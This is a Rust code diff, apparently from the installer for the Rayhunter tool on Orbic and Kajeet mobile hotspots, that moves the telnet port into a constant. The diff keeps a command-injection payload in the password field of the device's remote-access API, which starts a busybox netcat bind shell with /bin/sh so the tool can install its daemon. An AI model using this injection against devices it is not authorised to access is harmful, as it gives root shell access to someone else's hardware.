@@ -12,6 +12,9 @@ use crate::output::{eprintln, print, println};
 use crate::util::{interactive_shell, telnet_send_command, telnet_send_file};
 use crate::{CONFIG_TOML, RAYHUNTER_DAEMON_INIT};
 
+// Some kajeet devices have password protected telnetd on port 23, so we use port 24 just in case
+const TELNET_PORT: u16 = 24;
+
 #[derive(Deserialize, Debug)]
 struct ExploitResponse {
     retcode: u32,
@@ -101,10 +104,10 @@ async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Re
         .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
         .header("Content-Type", "application/json")
         .header("Cookie", authenticated_cookie)
-        // Original Orbic lacks telnetd (unlike other devices)
-        // When doing this, one needs to set prompt=None in the telnet utility functions
-        // But some kajeet devices have password protected telnetd so we use port 24 just in case
-        .body(r#"{"password": "\"; busybox nc -ll -p 24 -e /bin/sh & #"}"#)
+        // Original Orbic lacks telnetd (kajeet has it) so we need to use netcat
+        .body(format!(
+            r#"{{"password": "\"; busybox nc -ll -p {TELNET_PORT} -e /bin/sh & #"}}"#
+        ))
         .send()
         .await
         .context("failed to start telnet")?
@@ -166,7 +169,7 @@ pub async fn install(
 }
 
 async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
-    let addr = SocketAddr::from_str(&format!("{}:24", admin_ip))?;
+    let addr = SocketAddr::from_str(&format!("{admin_ip}:{TELNET_PORT}"))?;
     let timeout = Duration::from_secs(60);
     let start_time = std::time::Instant::now();
 
@@ -187,7 +190,7 @@ async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
 }
 
 async fn setup_rayhunter(admin_ip: &str) -> Result<()> {
-    let addr = SocketAddr::from_str(&format!("{}:24", admin_ip))?;
+    let addr = SocketAddr::from_str(&format!("{admin_ip}:{TELNET_PORT}"))?;
     let rayhunter_daemon_bin = include_bytes!(env!("FILE_RAYHUNTER_DAEMON"));
 
     // Remount filesystem as read-write to allow modifications
@@ -281,5 +284,5 @@ pub async fn shell(
     eprintln!(
         "This terminal is fairly limited. The shell prompt may not be visible, but it still accepts commands."
     );
-    interactive_shell(admin_ip, 24, false).await
+    interactive_shell(admin_ip, TELNET_PORT, false).await
 }
